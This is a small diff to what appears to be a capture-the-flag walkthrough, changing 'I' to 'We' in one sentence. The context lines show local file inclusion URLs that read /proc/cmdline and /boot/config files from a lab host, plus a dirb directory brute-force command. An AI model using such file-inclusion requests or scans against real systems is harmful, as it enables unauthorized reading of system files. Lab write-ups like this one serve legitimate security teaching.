@@ -260,7 +260,7 @@ http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&add=Extract
 http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&add=Extract+File
 {% endcodeblock %}
 
-I gave up hacking via /proc, but dirb reveals another files:
+We gave up hacking via /proc, but dirb reveals another files:
 {% codeblock %}
 root@kali32:~# dirb http://192.168.80.158:33447/Challenge/Magic_Box/  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw
 
